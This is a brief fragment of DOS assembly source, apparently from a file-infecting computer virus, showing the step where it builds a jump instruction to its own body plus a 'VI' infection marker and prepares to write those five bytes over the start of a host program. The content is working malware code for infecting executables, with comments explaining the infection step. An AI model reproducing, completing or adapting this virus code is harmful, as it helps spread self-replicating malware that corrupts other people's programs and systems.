...
;    int 21H                       ; ghi        
    ...
    mov BX, [VIR_START]
    mov BYTE PTR [DATA_ARRAY],0E9H ;first the near jump op code E9
    mov ax,WORD PTR [FSIZE] ;and then the relative address
    add ax,OFFSET START_VIRUS-OFFSET VIRUS-3 ;these go to DATA_ARRAY
    mov WORD PTR [DATA_ARRAY+1],ax
    mov WORD PTR [DATA_ARRAY+3],4956H ;and put "VI" code in
    mov cx,5 ;ok, now go write the 5 bytes we just put in DATA_ARRAY
    mov dx,OFFSET DATA_ARRAY ;ds:dx = pointer to DATA_ARRAY
